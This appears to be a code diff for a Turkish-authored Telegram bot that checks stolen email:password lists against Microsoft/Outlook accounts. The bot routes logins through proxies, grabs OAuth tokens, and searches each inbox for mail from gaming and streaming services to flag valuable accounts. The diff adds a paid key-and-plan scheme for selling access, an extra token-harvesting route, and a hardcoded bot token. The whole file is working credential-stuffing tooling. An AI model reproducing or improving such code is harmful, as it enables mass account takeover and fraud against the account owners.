@@ -9,27 +9,27 @@ from email.utils import parsedate_to_datetime
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 BOT_TOKEN = "8847630217:AAGcuENjLnIzHtUBbvxnKDBoa_DxW2a8yE0"
+ADMIN_ID = 7969180514
+ADMIN_USERNAME = "@imkansizligim"
 
+THREAD_COUNT = 10
 ADMIN_THREAD = 10
+
+KEY_FILE = "keys.json"
+USER_FILE = "users.json"
 
 HITS_FILE = "hotmailbothits.txt"
 TWOFA_FILE = "checkerbot2FA.txt"
 ZIP_FILE = "hotmailgamechecker.zip"
 
-user_proxies = []
+user_proxies = {}
 proxy_waiting = {}
-proxy_index = 0
-aktif_progress = {}
+user_proxy_index = {}
 
 GAME_EMAILS = {
-    "supercell": {
-        "email": "noreply@id.supercell.com",
-        "file": "supercellbothits.txt",
-        "label": "🎮 SUPERCELL",
-        "keywords": ["Clash of Clans", "Clash Royale", "Brawl Stars", "Hay Day", "Boom Beach"],
-    },
+    "supercell": {"email": ["noreply@id.supercell.com", "no-reply@email.supercell.com"], "file": "supercellbothits.txt", "label": "🎮 SUPERCELL"},
     "konami": {"email": "konami-info@konami.net", "file": "konamibothits.txt", "label": "🕹️ KONAMI"},
-    "efootball_coin": {"email": None, "file": "efootballcoinbothits.txt", "label": "⚽ EFOOTBALL COIN", "content_search": "eFootball™ Coin"},
+    "efootball_coin": {"email": "konami-info@konami.net", "file": "efootballcoinbothits.txt", "label": "⚽ EFOOTBALL COIN", "content_search": "eFootball™ Coin"},
     "pubg": {"email": ["noreply@pubgmobile.com", "noreply@mail.pubgmobile.com"], "file": "pubgbothits.txt", "label": "🔫 PUBG"},
     "ea": {"email": "EA@e.ea.com", "file": "eabothits.txt", "label": "⚽ EA"},
     "epic": {"email": "help@acct.epicgames.com", "file": "epicbothits.txt", "label": "🎯 EPIC"},
@@ -42,26 +42,48 @@ GAME_EMAILS = {
     "netflix": {"email": "info@account.netflix.com", "file": "netflixbothits.txt", "label": "🎬 NETFLIX"},
 }
 
-tarama_durdur = {}
-multi_bekleyen = {}
+PLANS = {
+    "free": {"name": "Free", "daily_limit": 5000, "single_limit": 1500, "duration": None, "thread": 10},
+    "daily": {"name": "Daily", "daily_limit": 0, "single_limit": 3000, "duration": 24, "thread": 10},
+    "weekly": {"name": "Weekly", "daily_limit": 0, "single_limit": 5000, "duration": 168, "thread": 10},
+    "monthly": {"name": "Monthly", "daily_limit": 0, "single_limit": 7000, "duration": 720, "thread": 10},
+    "admin": {"name": "Admin", "daily_limit": 0, "single_limit": 0, "duration": None, "thread": None},
+}
 
-def load_user_proxies(content):
-    global user_proxies, proxy_index
-    user_proxies = []
-    proxy_index = 0
+bakim_modu = False
+tarama_durdur = {}
+sira_kuyruk = {}
+multi_bekleyen = {}
+bekleyen_hesaplar = {}
+
+keys_db = {}
+users_db = {}
+
+def load_user_proxies(chat_id, content):
+    global user_proxies, user_proxy_index
+    user_id = str(chat_id)
+    user_proxies[user_id] = []
+    user_proxy_index[user_id] = 0
+    
     lines = content.strip().split('\n')
     for line in lines:
         line = line.strip()
         if line and not line.startswith('#'):
-            user_proxies.append(line)
-    return len(user_proxies)
+            user_proxies[user_id].append(line)
+    
+    return len(user_proxies[user_id])
 
-def get_user_proxy():
-    global user_proxies, proxy_index
-    if user_proxies:
-        proxy = user_proxies[proxy_index % len(user_proxies)]
-        proxy_index += 1
+def get_user_proxy(chat_id):
+    global user_proxies, user_proxy_index
+    user_id = str(chat_id)
+    
+    if user_id in user_proxies and user_proxies[user_id]:
+        proxies = user_proxies[user_id]
+        idx = user_proxy_index.get(user_id, 0)
+        proxy = proxies[idx % len(proxies)]
+        user_proxy_index[user_id] = idx + 1
         return proxy
+    
     return None
 
 def format_proxy(p):
@@ -75,6 +97,83 @@ def format_proxy(p):
         return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
     return f"http://{p}"
 
+def load_db():
+    global keys_db, users_db
+    try:
+        if os.path.exists(KEY_FILE):
+            with open(KEY_FILE, 'r') as f:
+                keys_db = json.load(f)
+    except:
+        keys_db = {}
+    try:
+        if os.path.exists(USER_FILE):
+            with open(USER_FILE, 'r') as f:
+                users_db = json.load(f)
+    except:
+        users_db = {}
+
+def save_db():
+    try:
+        with open(KEY_FILE, 'w') as f:
+            json.dump(keys_db, f, indent=2)
+    except:
+        pass
+    try:
+        with open(USER_FILE, 'w') as f:
+            json.dump(users_db, f, indent=2)
+    except:
+        pass
+
+def get_user_plan(chat_id):
+    if str(chat_id) == str(ADMIN_ID):
+        return "admin"
+    user_id = str(chat_id)
+    if user_id in users_db:
+        user_data = users_db[user_id]
+        plan = user_data.get("plan", "free")
+        key_expires = user_data.get("key_expires")
+        
+        if plan != "free" and key_expires:
+            expiry = datetime.fromisoformat(key_expires)
+            if datetime.now() > expiry:
+                users_db[user_id]["plan"] = "free"
+                users_db[user_id]["key_expires"] = None
+                users_db[user_id]["daily_used"] = 0
+                save_db()
+                send_message(chat_id, "⚠️ YOUR PLAN HAS EXPIRED\n\n📋 New Plan: Free")
+                return "free"
+            return plan
+        
+        return plan
+    
+    users_db[user_id] = {"plan": "free", "daily_used": 0, "last_reset": datetime.now().strftime('%Y-%m-%d')}
+    save_db()
+    return "free"
+
+def get_plan_info(plan):
+    return PLANS.get(plan, PLANS["free"])
+
+def check_daily_reset(chat_id):
+    user_id = str(chat_id)
+    if user_id in users_db:
+        today = datetime.now().strftime('%Y-%m-%d')
+        last_reset = users_db[user_id].get("last_reset", today)
+        if last_reset != today:
+            users_db[user_id]["daily_used"] = 0
+            users_db[user_id]["last_reset"] = today
+            save_db()
+
+def get_remaining_daily(chat_id):
+    check_daily_reset(chat_id)
+    plan = get_user_plan(chat_id)
+    plan_info = get_plan_info(plan)
+    daily_limit = plan_info["daily_limit"]
+    if daily_limit == 0:
+        return 999999999
+    user_id = str(chat_id)
+    daily_used = users_db.get(user_id, {}).get("daily_used", 0)
+    return daily_limit - daily_used
+
 def send_message(chat_id, text, reply_markup=None):
     try:
         data = {"chat_id": chat_id, "text": text}
@@ -84,43 +183,12 @@ def send_message(chat_id, text, reply_markup=None):
     except:
         pass
 
-def send_or_edit(chat_id, text, reply_markup=None, message_id=None):
-    try:
-        data = {"chat_id": chat_id, "text": text}
-        if reply_markup:
-            data["reply_markup"] = json.dumps(reply_markup)
-        if message_id:
-            data["message_id"] = message_id
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText", data=data, timeout=15)
-        else:
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=data, timeout=15)
-    except:
-        pass
-
 def send_document(chat_id, filepath):
     try:
         with open(filepath, 'rb') as f:
             requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                           data={"chat_id": chat_id},
                           files={"document": (os.path.basename(filepath), f)}, timeout=30)
-    except:
-        pass
-
-def pin_message(chat_id, message_id):
-    try:
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/pinChatMessage",
-                      data={"chat_id": chat_id, "message_id": message_id, "disable_notification": "true"},
-                      timeout=15)
-    except:
-        pass
-
-def unpin_message(chat_id, message_id=None):
-    try:
-        data = {"chat_id": chat_id}
-        if message_id:
-            data["message_id"] = message_id
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/unpinChatMessage",
-                      data=data, timeout=15)
     except:
         pass
 
@@ -136,6 +204,23 @@ def download_file(file_id):
         return content
     except:
         return None
+
+def generate_key(key_type):
+    import secrets
+    import string
+    chars = string.ascii_uppercase + string.digits
+    code = ''.join(secrets.choice(chars) for _ in range(4))
+    code2 = ''.join(secrets.choice(chars) for _ in range(4))
+    key = f"JULIANBOT-{key_type.upper()}-{code}-{code2}"
+    
+    keys_db[key] = {
+        "type": key_type,
+        "expires": None,
+        "bound_to": None,
+        "created": datetime.now().isoformat()
+    }
+    save_db()
+    return key
 
 def kerpetennecmi(line):
     line = line.strip()
@@ -153,7 +238,9 @@ def cokludosyayukle(dosya_listesi):
     tum_hesaplar = []
     for dosya in dosya_listesi:
         dosya = dosya.strip()
-        if not dosya or not os.path.exists(dosya):
+        if not dosya:
+            continue
+        if not os.path.exists(dosya):
             continue
         try:
             with open(dosya, 'r', encoding='utf-8', errors='ignore') as f:
@@ -164,7 +251,8 @@ def cokludosyayukle(dosya_listesi):
                     tum_hesaplar.append(norm)
         except:
             pass
-    return list(dict.fromkeys(tum_hesaplar))
+    benzersiz = list(dict.fromkeys(tum_hesaplar))
+    return benzersiz
 
 batmanparkyetkilisi = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -200,7 +288,7 @@ class marazali:
     def toyotacorollabest(self):
         s = requests.Session()
         retry = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
-        adapter = HTTPAdapter(max_retries=retry, pool_connections=10, pool_maxsize=10)
+        adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
         s.mount("https://", adapter)
         s.mount("http://", adapter)
         return s
@@ -307,6 +395,21 @@ class marazali:
                 if tok:
                     self.gelsinhayatbildigigibi = tok
                     return tok
+            self.soyleyememyeminederim = (
+                "https://login.live.com/oauth20_authorize.srf?"
+                "client_id=0000000048170EF2"
+                "&response_type=token"
+                "&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite"
+                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
+                "&prompt=none"
+            )
+            r = self.s.get(self.soyleyememyeminederim, headers=h, timeout=self.REQ, verify=False, allow_redirects=True)
+            parsed = urlparse(r.url)
+            if parsed.fragment:
+                tok = parse_qs(parsed.fragment).get("access_token", [None])[0]
+                if tok:
+                    self.bilmemhangiruzgaratti = tok
+                    return tok
             return None
         except:
             return None
@@ -326,8 +429,19 @@ class marazali:
         except:
             return False
 
-    def _api_post(self, query, token, size=500, top=3):
+    def search_messages(self, tag, game_key, token):
         try:
+            game_data = GAME_EMAILS[game_key]
+            
+            if "content_search" in game_data:
+                query = game_data["content_search"]
+            else:
+                emails = game_data["email"]
+                if isinstance(emails, list):
+                    query = "(" + " OR ".join(f'from:"{e}"' for e in emails) + ")"
+                else:
+                    query = f'from:"{emails}"'
+            
             url = "https://outlook.live.com/search/api/v2/query"
             params = {"n": "124", "cv": "tNZ1DVP5NhDwG%2FDUCelaIu.124"}
             body = {
@@ -345,10 +459,10 @@ class marazali:
                     "From": 0,
                     "Query": {"QueryString": query},
                     "RefiningQueries": None,
-                    "Size": size,
+                    "Size": 500,
                     "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
                     "EnableTopResults": True,
-                    "TopResultsCount": top
+                    "TopResultsCount": 3
                 }],
                 "AnswerEntityRequests": [{
                     "Query": {"QueryString": query},
@@ -373,60 +487,39 @@ class marazali:
                 "Content-Type": "application/json",
             }
             r = self.s.post(url, params=params, headers=h, json=body, timeout=self.REQ, verify=False)
-            if r.status_code != 200:
-                return 0, None
-            data = r.json()
-            total = 0
-            son_tarih = None
-            for es in data.get("EntitySets", []):
-                if es.get("Total") is not None:
-                    total = es.get("Total", 0)
-                    break
-            for es in data.get("EntitySets", []):
-                results = es.get("Results", [])
-                if results:
-                    date_str = results[0].get("DateTimeReceived") or results[0].get("DateTimeLastModified")
-                    if date_str:
-                        try:
-                            son_tarih = parsedate_to_datetime(date_str)
-                        except:
-                            pass
-                    break
-            if total == 0:
-                m = re.search(r'"Total":\s*(\d+)', r.text)
-                if m:
-                    total = int(m.group(1))
-            return total, son_tarih
+            
+            if r.status_code == 200:
+                data = r.json()
+                total = 0
+                son_tarih = None
+                
+                for es in data.get("EntitySets", []):
+                    if es.get("Total") is not None:
+                        total = es.get("Total", 0)
+                        break
+                
+                for es in data.get("EntitySets", []):
+                    results = es.get("Results", [])
+                    if results:
+                        first_result = results[0]
+                        date_str = first_result.get("DateTimeReceived") or first_result.get("DateTimeLastModified")
+                        if date_str:
+                            try:
+                                son_tarih = parsedate_to_datetime(date_str)
+                            except:
+                                pass
+                        break
+                
+                if total == 0:
+                    total_match = re.search(r'"Total":\s*(\d+)', r.text)
+                    if total_match:
+                        total = int(total_match.group(1))
+                
+                return total, son_tarih
+            
+            return 0, None
         except:
             return 0, None
-
-    def search_messages(self, tag, game_key, token):
-        game_data = GAME_EMAILS[game_key]
-        if "content_search" in game_data:
-            query = game_data["content_search"]
-        else:
-            emails = game_data.get("email")
-            if emails is None:
-                query = None
-            elif isinstance(emails, list):
-                query = "(" + " OR ".join(f'from:"{e}"' for e in emails) + ")"
-            else:
-                query = f'from:"{emails}"'
-            if "keywords" in game_data:
-                kw_parts = [f'"{k}"' for k in game_data["keywords"]]
-                kw_query = " OR ".join(kw_parts)
-                if query:
-                    query = f"({query} OR {kw_query})"
-                else:
-                    query = f"({kw_query})"
-        if not query:
-            return 0, None
-        return self._api_post(query, token, size=500, top=3)
-
-    def search_keyword(self, tag, keyword, token):
-        query = f'"{keyword}"'
-        sayi, _ = self._api_post(query, token, size=5, top=1)
-        return sayi
 
     def check(self, tag):
         status = self.nihathatipoglu(tag)
@@ -436,25 +529,19 @@ class marazali:
         token = self.kimseyisevemem(tag)
         if not token:
             return "BAD", None
-
+        
         time.sleep(1)
+        
         mesaj_info = {}
-
+        
         for game_key, game_data in GAME_EMAILS.items():
             sayi, tarih = self.search_messages(tag, game_key, token)
-            entry = {
+            mesaj_info[game_key] = {
                 "sayi": sayi,
                 "tarih": tarih.strftime('%Y-%m-%d %H:%M:%S') if tarih else 'N/A'
             }
-            if "keywords" in game_data and sayi > 0:
-                entry["keywords"] = {}
-                for kw in game_data["keywords"]:
-                    kw_sayi = self.search_keyword(tag, kw, token)
-                    entry["keywords"][kw] = kw_sayi
-                    time.sleep(0.3)
-            mesaj_info[game_key] = entry
             time.sleep(0.5)
-
+        
         return "SUCCESS", mesaj_info
 
 def create_zip():
@@ -478,50 +565,201 @@ def benferooolum():
         with open(f, 'w', encoding='utf-8') as fh:
             pass
 
-def ana_menu(chat_id, message_id=None):
+def ana_menu(chat_id):
+    if str(chat_id) == str(ADMIN_ID):
+        plan = "Admin"
+        kalan = "Unlimited"
+        thread = ADMIN_THREAD
+    else:
+        plan_name = get_user_plan(chat_id)
+        plan_info = get_plan_info(plan_name)
+        plan = plan_info["name"]
+        
+        user_id = str(chat_id)
+        user_data = users_db.get(user_id, {})
+        key_expires = user_data.get("key_expires")
+        
+        if key_expires and plan != "Free":
+            expiry = datetime.fromisoformat(key_expires)
+            remaining = expiry - datetime.now()
+            days = remaining.days
+            hours = remaining.seconds // 3600
+            minutes = (remaining.seconds % 3600) // 60
+            kalan = f"{days}d {hours}h {minutes}m"
+        else:
+            kalan = "Unlimited"
+        
+        thread = plan_info["thread"]
+    
     keyboard = {
         "inline_keyboard": [
-            [{"text": "🚀 Tara", "callback_data": "baslat"},
+            [{"text": "🚀 Start", "callback_data": "baslat"},
              {"text": "📂 Multi Scan", "callback_data": "multi_start"}],
-            [{"text": "⚡ Thread", "callback_data": "thread_menu"},
+            [{"text": "📊 Status", "callback_data": "durum"},
+             {"text": "🔑 Enter Key", "callback_data": "key_giris"}],
+            [{"text": "💰 Prices", "callback_data": "fiyatlar"},
              {"text": "📡 Proxy", "callback_data": "proxy"}],
-            [{"text": "📊 Durum", "callback_data": "durum"}],
         ]
     }
+    
+    if str(chat_id) == str(ADMIN_ID):
+        keyboard["inline_keyboard"].insert(0, [{"text": "⚡ Thread Settings", "callback_data": "thread_menu"}])
+        keyboard["inline_keyboard"].insert(2, [{"text": "🔑 Create Key", "callback_data": "key_olustur"}])
+    
     text = (
         f"╔══════════════════════════════════════════════╗\n"
-        f"║     HOTMAIL GAME CHECKER                    ║\n"
-        f"╚══════════════════════════════════════════════╝\n\n"
-        f"⚡ Thread: {ADMIN_THREAD}\n"
-        f"📡 Proxy: {len(user_proxies)}"
+        f"║     HOTMAIL GAME CHECKER - JULIAN BOT       ║\n"
     )
-    send_or_edit(chat_id, text, keyboard, message_id)
+    if str(chat_id) == str(ADMIN_ID):
+        text += f"║     👑 ADMIN PANEL 👑                       ║\n"
+    text += f"╚══════════════════════════════════════════════╝\n\n"
+    text += f"📋 Plan: {plan}\n"
+    text += f"⏳ Remaining: {kalan}\n"
+    text += f"⚡ Thread: {thread}\n"
+    
+    send_message(chat_id, text, keyboard)
 
-def proxy_menu(chat_id, message_id=None):
-    count = len(user_proxies)
+def proxy_menu(chat_id):
+    user_id = str(chat_id)
+    count = len(user_proxies.get(user_id, []))
+    
     keyboard = {
         "inline_keyboard": [
             [{"text": "📥 Proxy Ekle", "callback_data": "proxy_ekle"},
              {"text": "🗑️ Proxy Sil", "callback_data": "proxy_sil"}],
-            [{"text": "🔙 Geri", "callback_data": "main_menu"}],
+            [{"text": "🔙 Back", "callback_data": "main_menu"}],
         ]
     }
-    send_or_edit(chat_id, f"📡 PROXY MENU\n\nLoaded: {count} proxies", keyboard, message_id)
+    send_message(chat_id, f"📡 PROXY MENU\n\nLoaded: {count} proxies", keyboard)
 
-def durum_menu(chat_id, message_id=None):
+def fiyat_menu(chat_id):
+    text = (
+        f"💰 PRICE LIST\n\n"
+        f"📋 PLANS:\n"
+        f"────────────────────────────\n"
+        f"Daily: 750 TCoin\n"
+        f"Weekly: 3.000 TCoin\n"
+        f"Monthly: 9.000 TCoin\n\n"
+        f"💡 Contact: {ADMIN_USERNAME}"
+    )
+    send_message(chat_id, text)
+
+def durum_menu(chat_id):
+    if str(chat_id) == str(ADMIN_ID):
+        aktif_keyler = len([k for k, v in keys_db.items() if not v.get("expires") or datetime.fromisoformat(v["expires"]) > datetime.now()])
+        satilan_keyler = len([k for k, v in keys_db.items() if v.get("bound_to")])
+        toplam_kullanici = len(users_db)
+        premium = len([u for u in users_db.values() if u.get("plan") != "free"])
+        free = toplam_kullanici - premium
+        
+        text = (
+            f"👑 ADMIN STATUS\n\n"
+            f"📋 Plan: Admin\n"
+            f"⏳ Remaining: Unlimited\n"
+            f"📊 Scanning: Unlimited\n"
+            f"⚡ Thread: {ADMIN_THREAD}\n\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"Active Keys: {aktif_keyler}\n"
+            f"Sold Keys: {satilan_keyler}\n"
+            f"Total Users: {toplam_kullanici}\n"
+            f"Premium: {premium}\n"
+            f"Free: {free}"
+        )
+    else:
+        plan_name = get_user_plan(chat_id)
+        plan_info = get_plan_info(plan_name)
+        plan = plan_info["name"]
+        
+        user_id = str(chat_id)
+        user_data = users_db.get(user_id, {})
+        key_expires = user_data.get("key_expires")
+        
+        if key_expires and plan != "Free":
+            expiry = datetime.fromisoformat(key_expires)
+            remaining = expiry - datetime.now()
+            days = remaining.days
+            hours = remaining.seconds // 3600
+            kalan = f"{days}d {hours}h"
+        else:
+            kalan = "Unlimited"
+        
+        daily_limit = plan_info["daily_limit"]
+        single_limit = plan_info["single_limit"]
+        daily_used = user_data.get("daily_used", 0)
+        
+        if daily_limit > 0:
+            kalan_hak = daily_limit - daily_used
+        else:
+            kalan_hak = "Unlimited"
+        
+        proxy_count = len(user_proxies.get(str(chat_id), []))
+        
+        text = (
+            f"📊 STATUS PANEL\n\n"
+            f"📋 Plan: {plan}\n"
+            f"⏳ Remaining: {kalan}\n"
+            f"📊 Today: {daily_used}/{daily_limit if daily_limit > 0 else '∞'} scanned\n"
+            f"📂 Single Scan: {single_limit if single_limit > 0 else '∞'}\n"
+            f"⚡ Thread: {plan_info['thread']}\n"
+            f"📡 Proxies: {proxy_count}\n\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"Remaining today: {kalan_hak} accounts"
+        )
+    
+    send_message(chat_id, text)
+
+def key_menu(chat_id):
     keyboard = {
         "inline_keyboard": [
-            [{"text": "🔙 Geri", "callback_data": "main_menu"}],
+            [{"text": "📅 Daily Key (750 TCoin)", "callback_data": "key_daily"}],
+            [{"text": "📆 Weekly Key (3.000 TCoin)", "callback_data": "key_weekly"}],
+            [{"text": "🗓️ Monthly Key (9.000 TCoin)", "callback_data": "key_monthly"}],
+            [{"text": "🔙 Back", "callback_data": "main_menu"}],
         ]
     }
-    text = (
-        f"📊 STATUS\n\n"
-        f"⚡ Thread: {ADMIN_THREAD}\n"
-        f"📡 Proxies: {len(user_proxies)}"
-    )
-    send_or_edit(chat_id, text, keyboard, message_id)
+    send_message(chat_id, "🔑 CREATE KEY", keyboard)
 
-def thread_menu(chat_id, message_id=None):
+def keyler_listesi(chat_id):
+    if str(chat_id) != str(ADMIN_ID):
+        return
+    
+    aktif_keyler = []
+    for key, data in keys_db.items():
+        if data.get("expires"):
+            expiry = datetime.fromisoformat(data["expires"])
+            if expiry <= datetime.now():
+                continue
+        
+        kalan = ""
+        bitis = ""
+        if data.get("expires"):
+            expiry = datetime.fromisoformat(data["expires"])
+            remaining = expiry - datetime.now()
+            days = remaining.days
+            hours = remaining.seconds // 3600
+            kalan = f"{days}d {hours}h"
+            bitis = expiry.strftime('%Y-%m-%d %H:%M')
+        else:
+            kalan = "Not Started"
+            bitis = "Not started"
+        
+        bound = data.get("bound_to")
+        sahip = f"👤 {bound}" if bound else "👤 Not Sold"
+        
+        type_label = PLANS[data["type"]]["name"]
+        aktif_keyler.append(f"{key}\n📋 {type_label} | ⏳ {kalan} | 📅 {bitis} | {sahip}")
+    
+    if aktif_keyler:
+        text = "📋 ACTIVE KEYS\n\n" + "\n\n".join(aktif_keyler) + f"\n\n━━━━━━━━━━━━━━━━━━\nTotal: {len(aktif_keyler)} keys\n\nDelete: /keyiptal KEY"
+    else:
+        text = "📋 ACTIVE KEYS\n\nNo keys yet."
+    
+    send_message(chat_id, text)
+
+def thread_menu(chat_id):
+    if str(chat_id) != str(ADMIN_ID):
+        return
+    
     keyboard = {
         "inline_keyboard": [
             [{"text": "1", "callback_data": "thread_1"},
@@ -533,45 +771,98 @@ def thread_menu(chat_id, message_id=None):
             [{"text": "15", "callback_data": "thread_15"},
              {"text": "20", "callback_data": "thread_20"},
              {"text": "25", "callback_data": "thread_25"}],
-            [{"text": "🔙 Geri", "callback_data": "main_menu"}],
+            [{"text": "🔙 Back", "callback_data": "main_menu"}],
         ]
     }
-    send_or_edit(chat_id, f"⚡ THREAD SETTINGS\n\nCurrent: {ADMIN_THREAD}", keyboard, message_id)
+    send_message(chat_id, f"⚡ THREAD SETTINGS (ADMIN)\n\nCurrent: {ADMIN_THREAD} Thread", keyboard)
+
+def rapor(chat_id):
+    if str(chat_id) != str(ADMIN_ID):
+        return
+    
+    aktif_keyler = len([k for k, v in keys_db.items() if not v.get("expires") or datetime.fromisoformat(v["expires"]) > datetime.now()])
+    satilan_keyler = len([k for k, v in keys_db.items() if v.get("bound_to")])
+    toplam_kullanici = len(users_db)
+    premium = len([u for u in users_db.values() if u.get("plan") != "free"])
+    free = toplam_kullanici - premium
+    
+    text = (
+        f"📊 REPORT\n\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"Keys Sold: {satilan_keyler}\n"
+        f"Active Keys: {aktif_keyler}\n"
+        f"Total Users: {toplam_kullanici}\n"
+        f"Premium Users: {premium}\n"
+        f"Free Users: {free}\n\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"✍️ Julian Bot"
+    )
+    send_message(chat_id, text)
+
+def duyuru(chat_id, mesaj):
+    if str(chat_id) != str(ADMIN_ID):
+        return
+    
+    gonderilen = 0
+    for user_id in users_db:
+        try:
+            send_message(int(user_id), f"📢 ANNOUNCEMENT\n\n{mesaj}")
+            gonderilen += 1
+        except:
+            pass
+    
+    send_message(chat_id, f"✅ Announcement sent to {gonderilen} users.")
+
+def bakim(chat_id):
+    global bakim_modu
+    if str(chat_id) != str(ADMIN_ID):
+        return
+    
+    bakim_modu = not bakim_modu
+    if bakim_modu:
+        send_message(chat_id, "🔧 Bot is now in maintenance mode.\nUsers cannot scan.")
+    else:
+        send_message(chat_id, "✅ Bot is back online.")
 
 def tarama_yap(chat_id, accounts, dosya_adi):
     global ADMIN_THREAD
     benferooolum()
-
-    thread_sayisi = ADMIN_THREAD
+    
+    plan_name = get_user_plan(chat_id)
+    plan_info = get_plan_info(plan_name)
+    
+    if str(chat_id) == str(ADMIN_ID):
+        thread_sayisi = ADMIN_THREAD
+    else:
+        thread_sayisi = plan_info["thread"]
+    
     dogrudogru = len(accounts)
     babasarkikalmadi = time.time()
     tarama_durdur[chat_id] = False
-
+    
     egriegri = {"checked": 0, "hit": 0, "bad": 0, "twofa": 0, "errors": 0}
     for game_key in GAME_EMAILS:
         egriegri[game_key] = 0
-
+    
     lock = threading.Lock()
     semaphore = threading.BoundedSemaphore(thread_sayisi)
-
+    
     sent = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                          data={"chat_id": chat_id, "text": "📊 Preparing..."}, timeout=15).json()
+                          data={"chat_id": chat_id, "text": "📊 Scanning started..."}, timeout=15).json()
     progress_message_id = sent["result"]["message_id"] if sent.get("ok") else None
 
-    if progress_message_id:
-        aktif_progress[chat_id] = progress_message_id
-        pin_message(chat_id, progress_message_id)
-
     def check_one(combo):
+        nonlocal egriegri
         try:
             if tarama_durdur.get(chat_id, False):
+                semaphore.release()
                 return
             email, password = combo.split(":", 1)
             tag = email.split("@")[0][:12]
-
-            proxy_str = get_user_proxy()
+            
+            proxy_str = get_user_proxy(chat_id)
             formatted_proxy = format_proxy(proxy_str) if proxy_str else None
-
+            
             c = marazali(email, password, formatted_proxy)
             status, mesaj_info = c.check(tag)
             with lock:
@@ -586,16 +877,7 @@ def tarama_yap(chat_id, accounts, dosya_adi):
                             tarih = game_info.get("tarih", "N/A")
                             if sayi > 0:
                                 egriegri[game_key] += 1
-                                if "keywords" in game_data:
-                                    oyun_listesi = []
-                                    for kw in game_data["keywords"]:
-                                        kw_sayi = game_info.get("keywords", {}).get(kw, 0)
-                                        if kw_sayi > 0:
-                                            oyun_listesi.append(f"{kw} ✅")
-                                    oyun_str = " ".join(oyun_listesi) if oyun_listesi else ""
-                                    hit_line = f"{combo} | {game_data['label']} | Oyunlar: {oyun_str} | Last: {tarih}"
-                                else:
-                                    hit_line = f"{combo} | {game_data['label']} Messages: {sayi} | Last: {tarih}"
+                                hit_line = f"{combo} | {game_data['label']} Messages: {sayi} | Last: {tarih}"
                                 with open(game_data["file"], 'a', encoding='utf-8') as f:
                                     f.write(hit_line + "\n")
                                 print(f"✅ {game_data['label']} {hit_line}", flush=True)
@@ -614,33 +896,30 @@ def tarama_yap(chat_id, accounts, dosya_adi):
             semaphore.release()
 
     def progress_updater():
-        while True:
+        nonlocal egriegri, dogrudogru, babasarkikalmadi
+        while egriegri["checked"] < dogrudogru:
             time.sleep(3)
             if tarama_durdur.get(chat_id, False):
                 break
             with lock:
                 checked = egriegri["checked"]
-            if checked >= dogrudogru:
-                break
-            with lock:
                 hit = egriegri["hit"]
                 twofa = egriegri["twofa"]
                 bad = egriegri["bad"]
                 errors = egriegri["errors"]
-                game_sayilari = {k: egriegri[k] for k in GAME_EMAILS}
             total = dogrudogru
             elapsed = time.time() - babasarkikalmadi
             yuzde = (checked / total) * 100 if total > 0 else 0
             cpm = (checked / elapsed) * 60 if elapsed > 0 else 0
             filled = int(20 * checked // total) if total > 0 else 0
             bar = '█' * filled + '░' * (20 - filled)
-            mesaj = f"📊 SCANNING\n\n"
+            mesaj = f"📊 SCANNING IN PROGRESS\n\n"
             mesaj += f"📁 File: {dosya_adi}\n"
             mesaj += f"📊 Progress: {checked}/{total} ({yuzde:.1f}%)\n"
             mesaj += f"{bar}\n\n"
             mesaj += f"✅ HIT: {hit}\n"
             for game_key, game_data in GAME_EMAILS.items():
-                mesaj += f"{game_data['label']}: {game_sayilari[game_key]}\n"
+                mesaj += f"{game_data['label']}: {egriegri[game_key]}\n"
             mesaj += f"\n🔐 2FA: {twofa}\n"
             mesaj += f"❌ BAD: {bad}\n"
             mesaj += f"⚠️ ERRORS: {errors}\n\n"
@@ -673,8 +952,8 @@ def tarama_yap(chat_id, accounts, dosya_adi):
     elapsed = time.time() - babasarkikalmadi
     durdu = tarama_durdur.get(chat_id, False)
     zip_olustu = create_zip()
-
-    stats = f"{'⏹️ STOPPED' if durdu else '✅ COMPLETED'} ({int(elapsed)}s)\n\n"
+    
+    stats = f"{'⏹️ SCAN STOPPED' if durdu else '✅ SCAN COMPLETED'} ({int(elapsed)}s)\n\n"
     stats += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
     stats += f"🔱 Total: {dogrudogru}\n"
     stats += f"✅ Hit: {egriegri['hit']}\n"
@@ -684,23 +963,20 @@ def tarama_yap(chat_id, accounts, dosya_adi):
         stats += f"{game_data['label']}: {egriegri[game_key]}\n"
     stats += f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
     stats += f"📦 Sending result file..."
-
-    if progress_message_id:
-        try:
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
-                          data={"chat_id": chat_id, "message_id": progress_message_id, "text": stats}, timeout=15)
-        except:
-            pass
-
+    send_message(chat_id, stats)
+    
     if zip_olustu:
         send_document(chat_id, ZIP_FILE)
-
-    if progress_message_id:
-        unpin_message(chat_id, progress_message_id)
-    aktif_progress.pop(chat_id, None)
+    
+    if chat_id in bekleyen_hesaplar and bekleyen_hesaplar[chat_id].get("accounts"):
+        kalan_sayi = len(bekleyen_hesaplar[chat_id]["accounts"])
+        send_message(chat_id, f"📂 {kalan_sayi} more accounts remaining. Type /devam to continue.")
+    else:
+        bekleyen_hesaplar.pop(chat_id, None)
 
 def telegram_bot():
-    global offset, ADMIN_THREAD
+    global offset, ADMIN_THREAD, bakim_modu
+    load_db()
     offset = 0
